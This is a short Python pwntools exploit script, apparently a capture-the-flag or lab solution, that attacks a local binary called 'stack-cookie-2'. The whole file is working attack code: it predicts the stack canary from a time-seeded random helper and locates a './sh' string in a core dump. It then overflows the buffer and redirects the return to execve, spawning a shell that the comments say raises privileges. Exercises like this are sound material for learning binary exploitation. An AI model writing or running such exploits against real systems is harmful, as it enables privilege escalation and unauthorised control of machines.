from pwn import *

# Prog requires ./sh to be bin that raise priv and spawn shell
# Prog requires ./rand to be bin that seeds rand on time and prints first output to stdout
execve_addr = 0xf7eaf7e0 # From GDB

# GDB says buffer starts at ebp - 0x88
p = process(["./stack-cookie-2", "./sh"])
p2 = process("./rand")
cookie = int(p2.readline())

# Garbage to find sh
inp = "a" * 0x84 + p32(cookie) + "bbbb" + p32(100) + "cccc" + p32(100) + p32(0) + p32(0)
p.sendline(inp)
p.recv(0x100)
p.wait()
c = Core("./core")
sh_addr = c.stack.find("./sh")
p = process(["./stack-cookie-2", "./sh"])

# [0x84][canary][ebp][retaddr(execve)][4 garbage bytes][arg1(./sh)][arg2][arg3]
inp = "a" * (0x84) + p32(cookie) + "bbbb" + p32(execve_addr) + "cccc" + p32(sh_addr) + p32(0) + p32(0)

# Launch attack
p.sendline(inp)
p.interactive()

